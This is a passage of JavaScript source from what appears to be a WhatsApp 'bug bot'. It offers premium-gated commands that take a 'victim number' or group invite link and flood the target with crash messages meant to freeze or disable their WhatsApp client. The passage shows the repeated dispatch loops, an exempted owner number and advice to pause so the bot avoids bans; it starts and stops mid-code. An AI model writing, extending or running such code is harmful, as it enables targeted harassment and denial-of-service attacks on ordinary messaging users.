    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "internal-crash": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "crash-myinter": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "ui-grup": {
  
    if (!isPremium) return reply(mess.prem)
    if (!text) {
      return reply("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    reply("please wait, " + command + " bug is in process..");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return reply("Link Invalid!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await anggazyy.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      reply("*DONEâœ… BUG HAS BEEN SENT TO THE GROUP!.*");
      anggazyy.groupLeave(groupTarget);
    } catch (error) {
      reply(util.format(error));
    }
  }
  break;
case "internal-ui": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;

case "kalahkan": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;

case "caper": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "anggazyy-external": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "anggazyy-internal": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;

case "kontol": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "bantai-dia": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "addprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285702447728`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await anggazyy.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./all/database/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break
//=================================================//
case 'devilbug': case '🌹': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'bug-vip': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'spesial-war': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'war12': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyydevil(target, anggazyycrash)
await ngeloc(target, anggazyycrash)
}
await reply(`✅ Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 3 minutes so that the bot is not banned.`)
}
break
case 'war11': {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
if (!q) return reply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await reply(`In proses....`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await anggazyyiphone(target)
await ngeloc(target, anggazyycrash)
await penghitaman(target, anggazyycrash2)
await ngeloc(target, anggazyycrash)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
await anggazyyiphone(target)
